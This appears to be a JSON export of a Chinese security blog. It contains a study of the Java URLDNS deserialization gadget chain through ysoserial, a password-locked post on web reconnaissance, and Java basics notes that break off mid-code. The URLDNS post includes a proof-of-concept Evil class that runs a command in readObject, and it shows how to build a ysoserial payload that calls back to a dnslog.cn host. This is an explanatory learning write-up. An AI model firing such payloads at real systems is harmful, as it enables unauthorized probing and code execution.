[{"title":"URLDNS分析","url":"/2/","content":"\n学习了很久的Java基础，也看了很多的Java反序列化分析，现在也来分析学习哈最基础的URLDNS反序列化吧。\n\n\n\nJava反序列化基础\n为了方便数据的存储，于是乎有了现在的Java序列化于反序列化。序列化就是将Java对象存储到一个文件，反序列化则是读取序列化生产的文件，还原Java对象，常见的基础反序列化。\n\n首先类需要实现Serializable这个接口，虽然这个接口里面没有东西，但是不实现这个接口则无法序列化。用transient 关键字修饰的属性除外，不参与序列化过程。\n\nObjectOutputStream.writeObject()序列化对象。\n\nObjectInputStream.readObject()读取我们的对象，这里也是我们反序列化的利用点。\n// SerializeAndUnserialize.javapackage JavaSecurity.URLDNS;import java.io.*;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.ObjectInputStream;public class SerializeAndUnSerialize&#123;    public static void main(String[] args) throws Exception&#123;//        正常反序列化        serializeToFile(&quot;User.ser&quot;);        unSerializeToObject(&quot;User.ser&quot;);//        恶意反序列化        evilObject(&quot;Evil.ser&quot;);    &#125;    public static void serializeToFile(String file) throws IOException&#123;        User user = new User(&quot;Pan3a&quot;);        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(user);        objectOutputStream.flush();        objectOutputStream.close();    &#125;    public static void unSerializeToObject(String file) throws IOException, ClassNotFoundException &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        User user = (User)objectInputStream.readObject();        objectInputStream.close();        System.out.println(user.getName());        user.setName(&quot;Forever404&quot;);        System.out.println(user.getName());    &#125;    public static void evilObject(String file) throws Exception&#123;        Evil evil = new Evil();        evil.command = &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(evil);        objectOutputStream.flush();        objectOutputStream.close();        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        objectInputStream.readObject();        objectInputStream.close();    &#125;&#125;class User implements Serializable&#123;    private String name;    public User(String name)&#123;        this.name = name;    &#125;    public String getName()&#123;        return this.name;    &#125;    public void setName(String name)&#123;        this.name = name;    &#125;    private void writeObject(ObjectOutputStream objectOutputStream) throws IOException &#123;        objectOutputStream.defaultWriteObject();        objectOutputStream.writeObject(&quot;Hello, This is writeObject!!&quot;);    &#125;    private void readObject(ObjectInputStream objectInputStream) throws IOException,ClassNotFoundException&#123;        objectInputStream.defaultReadObject();        String message = (String) objectInputStream.readObject();        System.out.println(message);    &#125;&#125;class Evil implements Serializable&#123;    public String command;    private void readObject(ObjectInputStream objectInputStream) throws IOException,ClassNotFoundException&#123;        objectInputStream.defaultReadObject();        Runtime.getRuntime().exec(command);    &#125;&#125;\n\n输出\nHello, This is writeObject!!Pan3aForever404\n\n这里序列化生成的数据。\n\n\n\n\n分析Evil类，这里控制了该类的readObject方法，那么则可能造成漏洞。\n\n\nYsoserial\nysoserial是一个Java反序列化漏洞利用工具，通常用于检测是否存在Java反序列化漏洞。\n\nhttps://github.com/frohoff/ysoserial\n\n这里可以将其克隆下来再将其打包成jar文件即可，然后会在生成一个target目录，里面就有生成的jar。\nmvn clean package -DskipTests\n\n生成payload\nhttp://www.dnslog.cn/\n\n获取一个DNS。\n\n\n\n\n生成我们的payload。\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://0ehcf6.dnslog.cn&quot; &gt; ~/Temp/URLDNS.ser\n\n\n编写漏洞代码// URLDNSYsoSerialTestpackage JavaSecurity.URLDNS;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class URLDNSYsoSerialTest &#123;    public static void main(String[] args) throws IOException,ClassNotFoundException &#123;        FileInputStream inputStream = new FileInputStream(&quot;/Users/pan3a/Temp/URLDNS.ser&quot;);        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);        objectInputStream.readObject();    &#125;&#125;\n\n\nDNS获取到请求记录。\n\n\nURLDNS\nURLDNS，它的功能正如其名发起DNS请求，因此无法回显，只能检测Java反序列化漏洞，构造好测试代码，然后开始调试。\npackage JavaSecurity.URLDNS;import java.io.*;import java.net.InetAddress;import java.net.URL;import java.util.HashMap;import java.lang.reflect.Field;import java.io.ObjectOutputStream;public class URLDNSPoc &#123;    public static void main(String[] args) throws Exception&#123;        urlDns();        unSerializeToObject(&quot;urlDns.ser&quot;);//        addressGetByName();    &#125;    public static void urlDns() throws Exception &#123;        HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();        URL url = new URL(&quot;https://pjm4n7.dnslog.cn&quot;);        Class&lt;? &gt; clazz = Class.forName(&quot;java.net.URL&quot;);        Field field = clazz.getDeclaredField(&quot;hashCode&quot;);        field.setAccessible(true);        hashMap.put(url, &quot;Pan3a&quot;);        field.set(url, -1);        serializeToFile(&quot;urlDns.ser&quot;, hashMap);    &#125;    public static void serializeToFile(String file,Object object) throws IOException &#123;        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));        objectOutputStream.writeObject(object);    &#125;    public static void unSerializeToObject(String file) throws Exception &#123;        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(file));        objectInputStream.readObject();    &#125;    //   最后发现是由getByName函数发起DNS请求，测试证明。    public static void addressGetByName() throws Exception&#123;        URL url = new URL(&quot;https://pjm4n7.dnslog.cn&quot;);        String host = url.getHost();        InetAddress addr = InetAddress.getByName(host);        String domainName = addr.getHostName();//获得主机名        String IPName = addr.getHostAddress();//获得IP地址        System.out.println(&quot;hostname:&quot; + domainName);        System.out.println(&quot;IPName:&quot; + IPName);    &#125;&#125;\n\n由于知道网上的利用链（Gatget Chain）是在HashMap的readObject方法触发的，因此我们直接在HashMap的readObject方法处下断点位置下断点即可，有些可能因为IDEA默认配置有个黑名单调试时不进入某些类，我们直接取消该选项。（因个人喜而异，能调试都可以。）\n\n\n\n\n在HashMap类的1367行进入了调试模式，接下来继续向下跟。\n\n\nprivate void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;\n\n\n这里一直向下跟进直到36行的一个for循环发现这里有readObject方法，我们传入的key又是java.net.URL对象，继续向下走然后到41行的的putVal方法，再继续跟进hash方法。\n\n\n\n跟进hash方法后，因为key不为空，发现里面的hashCode方法，那么继续跟进。\nstatic final int hash(Object key) &#123;    int h;    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125;\n\n这里是java.net.URL对象，因此跟进到URL.java的898行，当时的hashCode值为-1，因此进入下面的handler的hashCode方法。\npublic synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;\n\nhandler又是URLStreamHandler的对象，于是乎跟进URLStreamHandler的第350行，这里的参数u则是我们刚才传递的URL对象。\nprotected int hashCode(URL u) &#123;        int h = 0;        // Generate the protocol part.        String protocol = u.getProtocol();        if (protocol != null)            h += protocol.hashCode();        // Generate the host part.        InetAddress addr = getHostAddress(u);        if (addr != null) &#123;            h += addr.hashCode();        &#125; else &#123;            String host = u.getHost();            if (host != null)                h += host.toLowerCase().hashCode();        &#125;        // Generate the file part.        String file = u.getFile();        if (file != null)            h += file.hashCode();        // Generate the port part.        if (u.getPort() == -1)            h += getDefaultPort();        else            h += u.getPort();        // Generate the ref part.        String ref = u.getRef();        if (ref != null)            h += ref.hashCode();        return h;    &#125;\n\n第10行获取host和port跟进。\nprotected synchronized InetAddress getHostAddress(URL u) &#123;    if (u.hostAddress != null)        return u.hostAddress;    String host = u.getHost();    if (host == null || host.equals(&quot;&quot;)) &#123;        return null;    &#125; else &#123;        try &#123;            u.hostAddress = InetAddress.getByName(host);        &#125; catch (UnknownHostException ex) &#123;            return null;        &#125; catch (SecurityException se) &#123;            return null;        &#125;    &#125;    return u.hostAddress;&#125;\n\nInetAddress.getByName则进行一次DNS请求获取，到这里差不多也就结束了。\n\ngadGet Chain\nHashMap-&gt;readObject()HashMap-&gt;hash()URL-&gt;hashCode()URLStreamHandler-&gt;hashCode()URLStreamHandler-&gt;getHostAddress()InetAddress-&gt;getByName()\n\nYsoseria分析环境搭建\n直接用IDEA打开我们克隆下来的项目，由于我有两个Java版本自动把项目配置为JDK14了，因此需要更改JDK版本，打开File-&gt;Project Structure。\n\n\n\n\n有pom.xml得知我们的主类文件是GeneratePayload.java，运行查看环境是否成功。\n\n\n\n由于他是命令行获取的参数，因此我们配置当前文件运行参数，或者自己注释获取参数的17-20代码，直接给出传递的参数值，这里就采用配置参数的形式。\n\n\n调试分析\n这里断点直接放到第9行。\npublic static void main(final String[] args) &#123;\tif (args.length != 2) &#123;\t\tprintUsage();\t\tSystem.exit(USAGE_CODE);\t&#125;\tfinal String payloadType = args[0];\tfinal String command = args[1];\tfinal Class&lt;? extends ObjectPayload&gt; payloadClass = Utils.getPayloadClass(payloadType);\tif (payloadClass == null) &#123;\t\tSystem.err.println(&quot;Invalid payload type &#x27;&quot; + payloadType + &quot;&#x27;&quot;);\t\tprintUsage();\t\tSystem.exit(USAGE_CODE);\t\treturn; // make null analysis happy\t&#125;\ttry &#123;\t\tfinal ObjectPayload payload = payloadClass.newInstance();\t\tfinal Object object = payload.getObject(command);\t\tPrintStream out = System.out;\t\tSerializer.serialize(object, out);\t\tObjectPayload.Utils.releasePayload(payload, object);\t&#125; catch (Throwable e) &#123;\t\tSystem.err.println(&quot;Error while generating or serializing payload&quot;);\t\te.printStackTrace();\t\tSystem.exit(INTERNAL_ERROR_CODE);\t&#125;\tSystem.exit(0);&#125;\n\n来到Utils.getPayloadClass，这里是payloadType则是我们第攻击模块，这里传递的是URLDNS。\npublic static Class&lt;? extends ObjectPayload&gt; getPayloadClass ( final String className ) &#123;     Class&lt;? extends ObjectPayload&gt; clazz = null;     try &#123;         clazz = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);     &#125;     catch ( Exception e1 ) &#123;&#125;     if ( clazz == null ) &#123;         try &#123;             return clazz = (Class&lt;? extends ObjectPayload&gt;) Class                     .forName(GeneratePayload.class.getPackage().getName() + &quot;.payloads.&quot; + className);         &#125;         catch ( Exception e2 ) &#123;&#125;     &#125;     if ( clazz != null &amp;&amp; !ObjectPayload.class.isAssignableFrom(clazz) ) &#123;         clazz = null;     &#125;     return clazz; &#125;\n\n这里就是利用反射来获取我们需要的类，因为是forName因此需要全限定类名，然后返回获取的类，因为可以获取到URLDNS类payloadClass则不为空，进入try代码块。\ntry &#123;\t\t\tfinal ObjectPayload payload = payloadClass.newInstance();\t\t\tfinal Object object = payload.getObject(command);\t\t\tPrintStream out = System.out;\t\t\tSerializer.serialize(object, out);\t\t\tObjectPayload.Utils.releasePayload(payload, object);\t\t&#125;\n\n将URLDNS类通过反序列化的方式进行初始化，然后进入getObject方法。\npublic Object getObject(final String url) throws Exception &#123;        //Avoid DNS resolution during payload creation        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.        URLStreamHandler handler = new SilentURLStreamHandler();        HashMap ht = new HashMap(); // HashMap that will contain the URL        URL u = new URL(null, url, handler); // URL to use as the Key        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.        return ht;&#125;\n\n这里又实例化了SilentURLStreamHandler()，继续向下跟进。\nstatic class SilentURLStreamHandler extends URLStreamHandler &#123;                protected URLConnection openConnection(URL u) throws IOException &#123;                        return null;                &#125;                protected synchronized InetAddress getHostAddress(URL u) &#123;                        return null;                &#125;        &#125;\n\n这里继承了URLStreamHandler，重写了下面两个方法，其中让getHostAddress为空，因此不会触发InetAddress.getByName从而没有DNS请求，对比哈原生URLStreamHandler类。\nprotected synchronized InetAddress getHostAddress(URL u) &#123;        if (u.hostAddress != null)            return u.hostAddress;        String host = u.getHost();        if (host == null || host.equals(&quot;&quot;)) &#123;            return null;        &#125; else &#123;            try &#123;                u.hostAddress = InetAddress.getByName(host);            &#125; catch (UnknownHostException ex) &#123;                return null;            &#125; catch (SecurityException se) &#123;                return null;            &#125;        &#125;        return u.hostAddress;    &#125;\n\n接下来就是基础的通过反射使URL对象的hashCode值为-1，然后返回对象。再调用Serializer.serialize(object, out)对我们的hashMap对象进行序列化操作。\npublic static void serialize(final Object obj, final OutputStream out) throws IOException &#123;\tfinal ObjectOutputStream objOut = new ObjectOutputStream(out);\tobjOut.writeObject(obj);&#125;\n\n这里就正常序列化然后调用输出流，ObjectPayload.Utils.releasePayload则是判断URLDNS是否为ReleaseableObjectPayload的一个子类，这个类是是一个接口，定义了一个release方法，然后就结束了，退出程序。\n\n\n\n","categories":["JavaSecurity"]},{"title":"浅谈Web信息搜集","url":"/3/","content":"\n  7140bd27c8c3a1a812f1a9251eb3ba92473368bd3de4f630bd11118f0ec899c36a3f0de818e09a818559a54c19d9a580efa820d1e3c1464a405379b0d4a55dfa2dae728fc4adfe95316ca38cfdfc5ec4b8f5c0abd40993b71a50369e3d3be78651e0a6ef30ddb4b2de746fa5020794dbf5aa65bfd1e406eba1b75b2b6f536597811c999553d5ee3f38e90a56d32f9e299c96e2337785dccf68eeb190cbba566af68a2d9b9e1863d455dcda5bd5bb255741b351610464f581f2a2c535abd461155b9c35b0c545faca9b3743c8622caff72529fbfce5d801d4e8ffd976898308fdaeba49373f3c81650f5ab27d384b474b0024ce1384c10d46b408c913eba3ed0f066ae1075d2998886edf7962a4a4e5a4cea5de29b2e29086508f5ec0ded01450c478a6a748aa252cd5ee2641fa013f187d18d300462cf995bba52c9ea09246303d30bc22d63fbb9cf0d98fa9ff8ef68491d622dcb5a53f5ab3aa528ddf1645f6575aaca567e38d5f1f2dbcfc2e9d20ccf3e965caafdc0b3bc4b51f16a38ade1cab94df8d19125bb33d6524617edf2a2ce4d57cd9f187aed42c05376cd2577e6eaf8b0caf7ba404ba5f9388fa88fd6d961d0f9c8eb3d2d5a0bd940ccf43f4cd235d905686116c418086272045df50ace9a5ef606ad7a2c0229eebf29d44a625036f9dc7e003a3423418e8fdabb67f22b20b48788bbf5e604ed3f668d6a3a4323d2566eea35778718b3ff5710b0615a244e733486be74e2d420a643b6cd3634925a037c58802af835287fcfa81de08da9d855e80cef8a323ee092f3898580b3c142a43df38d15e3cd557852c7cf7ebe80b545f807e9e878655276ed1342a5379c5d903b8cc2cebcec9ec841a09571e62615e76f37116cef6025e964665d133d30f517f67c1d046d5ff4c5d55f51cac83183d8f66cac4ffa38040ec5f26d06f62a058aa38b243d1fa2da9e9b04305e5b6fa3f873db5534b4df9048e520431fecb5a8448cde68ddcddf7c60feda5ea41912737544029e6ec46ea0612c01a1b1f078ce66d7373a0789a94ab32c0036e225e420b077f0883a31af991101253052bc85124656fef9006fc3b98000e97fd22bc4cf62a55b046f652e9ab0c1742269b2f78749faf3daa2fa62cb299cfcaa2729ad004180b66ce9357a48363d00631dba6e6ec216a4f470091c14d4fbc0b3845917e2460d0ad6ec5c80475fe53d86ac7e4758b62133110caf80c2119f3e98914edd533ad89d3d260da549fb34ed23523d1dbcbed8461550db4cf4d4f7bdb4c20abfd85534e602bfa9c15910fd822db3372c7b6c7954e7f95336a80b23ebcda728e150f4cbd0d06980196a34b8f21f19bc73f43f322c036492ca50a79aef4fa5b0ca0af345290a02d15291daa6569a66b65eb0900d71f8d361283f1060e62c1bfee3508828998b1dab43f265997547c840362c9223c0d8b51f5780047fa9d7f44a2c4d099e88febbf1453a93f443bda8a55327960611c3821eb4e017a38459aefd2ae94d099f0f829e8728e2b01fd301ddc9f989810e5e173d9cd3bbb5cb16dd372fbc1691392dea2c96868529236a80f0bfd\n  \n    \n      \n      \n        Hey, password is required here.\n      \n    \n  \n\n","categories":["Web"]},{"title":"Java基础学习","url":"/1/","content":"\nJava基础的一些知识点。\n\nJavaBasic\n创建的文件名需与类名一致，即HelloWorld.java，严格要求大小写。\n主函数参数可为String args[]与String[] args。\n一个源文件只能有一个public类，且仅为文件名相同的类为public属性。\njava文件运行是javac将Hello.java文件编译成Hello.class的字节码，然后由jvm虚拟机对其进行解释执行。\n\npublic class HelloWorld&#123;\tpublic static void main(String[] args)&#123;\t\tSystem.out.println(&quot;Hello World&quot;)\t&#125;&#125;\n\n\n访问控制符\nprivate，default，protected，public四个标识符。\n\n\n\n同一个类中\n同一个包中\n(不同包)子类中\n全局范围内\n\n\n\nprivate\n✓\n\n\n\n\n\ndefault\n✓\n✓\n\n\n\n\nprotected\n✓\n✓\n✓\n\n\n\npublic\n✓\n✓\n✓\n✓\n\n\n\n\nprivateprivate只允许当前类进行访问，继承也无法访问。\npublic class AccessControlStudy &#123;    private int age = 18;    public String name = &quot;Pan3a&quot;;    protected String love = &quot;java&quot;;    private void sayAge()&#123;        System.out.println(&quot;age:&quot; + Integer.toString(this.age) );    &#125;    public void sayName()&#123;        System.out.println(&quot;name:&quot; + this.name);    &#125;    protected void sayLove()&#123;        System.out.println(&quot;love:&quot; + this.love);    &#125;&#125;class Test extends AccessControlStudy&#123;&#125;class PrivateStudy&#123;    public static void main(String[] args) &#123;        AccessControlStudy ac = new AccessControlStudy();        Test test = new Test();//        ac.sayAge();    //        test.sayAge();  //       因为private原因，直接无法编译。子类和实例化对象都无法访问。        ac.sayName();        test.sayName();        ac.sayLove();        test.sayLove();    &#125;&#125;\n\n\ndefault\n只能是同一个类或同一个包中访问。\n\npackage com.Pan3a.DefaultStudy;public class AccessControlStudy&#123;    String name = &quot;Pan3a&quot;;&#125;\n\n\n\n不同的另外一个包\n\npackage com.Pan3a.Class;public class AccessControlStudyThree &#123;    String name = &quot;Pan3a&quot;;    public  void SayName()&#123;        System.out.println(&quot;Hello &quot; + this.name);    &#125;&#125;\n\n\n\n测试文件\n\npackage com.Pan3a.DefaultStudy;import com.Pan3a.Class.AccessControlStudyThree;public class AccessControlStudyTwo &#123;    public static void main(String[] args) &#123;//      同一个包中的default可以使用        com.Pan3a.DefaultStudy.AccessControlStudy ac = new com.Pan3a.DefaultStudy.AccessControlStudy();        System.out.println(ac.name);//      不同包中        com.Pan3a.Class.AccessControlStudyThree three = new AccessControlStudyThree();//      System.out.println(three.name);//      因为在不用包中因此调用时语法错误无法编译//      因为访问的是AccessControlStudyThree中的SayName方法，变量是实例化的类中因此可访问        three.SayName();    &#125;&#125;\n\n\nprotected\n同一个类或同一个包或不同包中子类访问。\n\npackage com.Pan3a.DefaultStudy;public class AccessControlStudy&#123;    protected String name = &quot;Pan3a&quot;;&#125;\n\n\n\n不同包中\n\npackage com.Pan3a.Class;public class AccessControlStudyThree &#123;    protected String name = &quot;Pan3a&quot;;    public  void SayName()&#123;        System.out.println(&quot;Hello &quot; + this.name);    &#125;&#125;\n\n\n\nprotected属性访问用继承式。\n\npackage com.Pan3a.DefaultStudy;import com.Pan3a.Class.AccessControlStudyThree;class ProtectedStudy extends AccessControlStudyThree&#123;    ProtectedStudy()&#123;        System.out.println(&quot;Hello &quot; + super.name);    &#125;&#125;public class AccessControlStudyTwo &#123;    public static void main(String[] args) &#123;//      同一个包中的default可以使用        com.Pan3a.DefaultStudy.AccessControlStudy ac = new com.Pan3a.DefaultStudy.AccessControlStudy();        System.out.println(ac.name);//      不同包中        com.Pan3a.Class.AccessControlStudyThree three = new AccessControlStudyThree();//        System.out.println(three.name);//      因为在不用包中因此调用时语法错误无法编译//      虽然是不同包中，但是这里可以通过继承的来访问        ProtectedStudy protectedStudy = new ProtectedStudy();//      因为访问的是AccessControlStudyThree中的SayName方法，变量是实例化的类中因此可访问        three.SayName();    &#125;&#125;\n\n\npublic\n适用于任何情况，但实际项目仍需手动指定属性。\n\n字符 &amp;&amp; 字符串\n字符用&#39;P&#39;这样的单引号进行包裹。\n字符串用&quot;Hello World&quot;这样的双引号进行包裹。\n\n字符数组\n字符数组\n\npublic class CharStudy&#123;&#125;   \tpublic\tstatic void main(String[] args)&#123;        char[] HelloArray = &#123;&#x27;H&#x27;,&#x27;e&#x27;,&#x27;l&#x27;,&#x27;l&#x27;,&#x27;o&#x27;&#125;;            String HelloString = new String(HelloArray);            System.out.println(HelloString);            System.out.println(HelloString + &quot;字符长度为:&quot; + HelloArray.length);    &#125;&#125;\n\n\n创建字符串public class StringStudy&#123;    public static void main(String[] args)&#123;        // 会创建一个匿名对象        String stringOne = &quot;Hello&quot;;        System.out.println(stringOne);                // 构造函数创建字符串        String stringTwo = new String(&quot;Pan3a&quot;);        System.out.println(stringTwo);                // 字符串拼接        String stringThree = &quot;Hello &quot; + stringTwo;        System.out.println(stringThree);                // 字符对比        String stringFour = stringOne.concat(stringTwo);        String stringFive = stringOne + stringTwo;        String stringSix = &quot;Hello Pan3a&quot;;        // 这里的 == 是比较内存中存放的首地址  equals 则是比较字符是否相同        if(stringSix == stringFour)&#123;            System.out.println(&quot;OK&quot;);        &#125;if(stringSix.equals(stringFour))&#123;            System.out.println(&quot;OK2&quot;);        &#125;    &#125;&#125;\n\n\n格式化字符串\n格式化数字可以用printf()和format()方法。\nformat()返回一个String对象而不是PrintStream，可以创建一个可复用的格式化字符串。\n\npublic class StringStudy&#123;    public static void main(String[] args)&#123;                int intVar = 1;        String stringVar = &quot;Hello World&quot;;        System.out.printf(&quot;整型变量:&quot; + &quot;%d&quot; + &quot; 字符串变量:%s&quot; + &quot;\\n&quot;,intVar,stringVar);        String fs;        fs = String.format(&quot;整型变量:&quot; + &quot;%d&quot; + &quot; 字符串变量:%s&quot;,intVar,stringVar);        System.out.println(fs);    &#125;&#125;\n\n\nStringBuffer &amp;&amp; StringBuilder\n这里的StringBuffer和StringBuilder来由是因为平常创建的字符串在修改的时候是重新创建的一个对象，而不是原字符串。后者没有线程安全，但是相比前者后者有速度优势，因此大多数情况下建议使用后者。\n\npublic class StringStudy&#123;    public static void main(String[] args)&#123;        StringBuilder sb = new StringBuilder(10);        sb.append(&quot;Hello World&quot;);        System.out.println(sb);        for(int num=0;num&lt;sb.length();num++)&#123;            System.out.println(sb.charAt(num));        &#125;        // 这里实例化类会将字符进行一次输出        StringBuffer sBuffer = new StringBuffer(&quot;Hello Pan3a&quot;);        sBuffer.append(&quot;你好，&quot;);        sBuffer.append(&quot;Pan3a&quot;);        System.out.println(sBuffer);    &#125;&#125;\n\n\n数组\n数组的遍历\n\npublic class ArrayStudy &#123;    public static void main(String[] args) &#123;//        数组大小        int size = 10;        int[] myList = new int[size];        for (int num=0;num&lt;size;num++)&#123;            myList[num] = size-(num+1);            System.out.println(Integer.toString(num) + &quot; &quot; + myList[num]);        &#125;//        加强型循环        for (int value:myList)&#123;            System.out.println(value);        &#125;    &#125;&#125;\n\n\n日期时间\n有时候需要查看当前时间并且格式化输出。\n\nimport java.text.SimpleDateFormat;import java.util.Date;public class DateStudy &#123;    public static void main(String[] args) &#123;        Date date = new Date();        SimpleDateFormat ft = new SimpleDateFormat(&quot;yyyy-MM-dd hh:mm:ss&quot;);        System.out.println(date.getTime());        System.out.println(date.toString());        System.out.println(&quot;当前时间:&quot; + ft.format(date));        System.out.printf(&quot;年-月-日:%tF%n&quot;,date);    &#125;&#125;\n\n\n正则表达式\n正则处理文本。\n\nimport java.util.regex.Matcher;import java.util.regex.Pattern;public class ReStudy &#123;    public static void main(String[] args) &#123;        String info = &quot;My name is Pan3a,I am from China&quot;;        String pattern = &quot;.*Pan3a.*&quot;;        boolean isMatch = Pattern.matches(pattern,info);        System.out.println(&quot;字符是否包含 &#x27;Pan3a&#x27; ？&quot; + isMatch);    &#125;&#125;\n\n\nI&#x2F;O\n平常接触多的应该就算文件的操作了。\n\nFile\n创建文件有个临时文件，删除文件\n\nimport java.io.*;public class FileStudy&#123;    public static void main(String[] args) throws IOException&#123;        String filePath = &quot;C:\\CodeProject\\JavaStudy\\src\\Flag&quot;;        File file = new File(filePath);        System.out.println(file);//      返回构造方法传入的路径//        System.out.println(file.getPath());//      返回绝对路径//        System.out.println(file.getAbsolutePath());//      类似于绝对路径，但是更规范//        System.out.println(file.getCanonicalPath());        if(file.isFile())&#123;            System.out.println(file.getAbsoluteFile() + &quot; 这是一个文件&quot;);//          判断文件是否可读            if(file.canRead())&#123;                System.out.println(file.getAbsoluteFile() + &quot; 文件可读&quot;);            &#125;else &#123;                System.out.println(file.getAbsoluteFile() + &quot; 文件不可读&quot;);            &#125;//          判断文件是否可写            if (file.canWrite())&#123;                System.out.println(file.getAbsoluteFile() + &quot; 文件可写&quot;);            &#125;//          判断文件可执行            if(file.canExecute())&#123;                System.out.println(file.getAbsoluteFile() + &quot; 文件可执行&quot;);            &#125;        &#125;      File tempFile = File.createTempFile(&quot;tmp&quot;,&quot;.txt&quot;);      if(tempFile.isFile())&#123;     \t System.out.println(tempFile.getAbsoluteFile() + &quot; 临时文件创建成功&quot;);\t\t tempFile.deleteOnExit(); \t     System.out.println(tempFile.getAbsolutePath());      &#125;    &#125;&#125;\n\n\n目录\n和文件类似，多的是目录中的文件和目录遍历，目录删除时无法删除非空目录。\n\nimport java.io.*;public class FileStudy&#123;    public static void main(String[] args) throws IOException&#123;        //      创建目录       File createDir = new File(&quot;Hello&quot;);       // File createDirs = new File(&quot;Hello/Hello/Hello&quot;);        // if(createDirs.mkdirs())   这里mkdirs 可以创建没有的父目录       if(createDir.mkdir())&#123;           System.out.println(&quot;OK&quot;);           if(createDir.delete())&#123;               // 这里的删除只能删除非空的目录               System.out.println(createDir.getAbsolutePath() + &quot; 文件删除成功&quot;);           &#125;       &#125;       String dirPath = &quot;C:\\\\windows&quot;;       File dir = new File(dirPath);       File[] dirs = dir.listFiles(new FilenameFilter() &#123;            // 重载方法，过滤不需要的文件            @Override            public boolean accept(File dir, String name) &#123;                return name.endsWith(&quot;.exe&quot;);            &#125;       &#125;  \t   );//        for (int i=0;i&lt;dirs.length;i++)&#123;//            System.out.println(dirs[i]);//        &#125;        for (File f:dirs)&#123;            System.out.println(f);        &#125;    &#125;&#125;\n\n\nInputStream\n所有与IO操作相关的代码都必须正确处理IOException，否则无法正常运行。\n读取文本是字节或字符串。\n\nimport java.io.FileInputStream;import java.io.IOException;import java.io.InputStream;public class InputStreamStudy &#123;    public static void readFile() throws IOException&#123;        try(InputStream inputStream = new FileInputStream(&quot;c://CodeProject//JavaStudy//src//Flag&quot;))&#123;            int n;            while ((n = inputStream.read()) != -1)&#123;                System.out.println((char) n);            &#125;        &#125;    &#125;    public static void readFileBuffer() throws IOException&#123;        try(InputStream inputStream = new FileInputStream(&quot;c://CodeProject//JavaStudy//src//Flag&quot;))&#123;            byte[] buffer = new byte[1000];            int n;            while ((n = inputStream.read(buffer)) != -1)&#123;                System.out.println(&quot;read &quot; + n + &quot; bytes&quot;);            &#125;        &#125;    &#125;    public static String readFileAsString(InputStream inputStream) throws IOException&#123;        int n;        StringBuilder stringBuilder = new StringBuilder();        while ((n = inputStream.read()) != -1)&#123;            stringBuilder.append((char) n);        &#125;        return stringBuilder.toString();    &#125;    public static void main(String[] args) throws IOException &#123;        InputStream inputStream = new FileInputStream(&quot;c://CodeProject//JavaStudy//src//Flag&quot;);        for (;;)&#123;            int n = inputStream.read();  // 反复读取            if(n == -1)&#123;                break;            &#125;            System.out.println(n); // 打印的byte的值        &#125;        inputStream.close();//        如果代码出错，并不会回收输入流，可用try        readFile();//        一次读取一个字节不高效，因此可以使用缓冲        readFileBuffer();//        读取文本字符        String string;        try(InputStream input = new FileInputStream(&quot;c://CodeProject//JavaStudy//src//Flag&quot;))&#123;            string = readFileAsString(input);        &#125;        System.out.println(string);    &#125;&#125;\n\n\nOutputStream\n文件写入，没看到追加\n\nimport java.io.FileOutputStream;import java.io.IOException;import java.io.OutputStream;public class OutputStreamStudy &#123;    public static void main(String[] args) throws IOException&#123;        String fileName = &quot;c:\\\\CodeProject\\\\JavaStudy\\\\src\\\\Flag&quot;;        try(OutputStream outputStream = new FileOutputStream(&quot;c:\\\\CodeProject\\\\JavaStudy\\\\src\\\\Flag&quot;))&#123;            outputStream.write(&quot;Hello 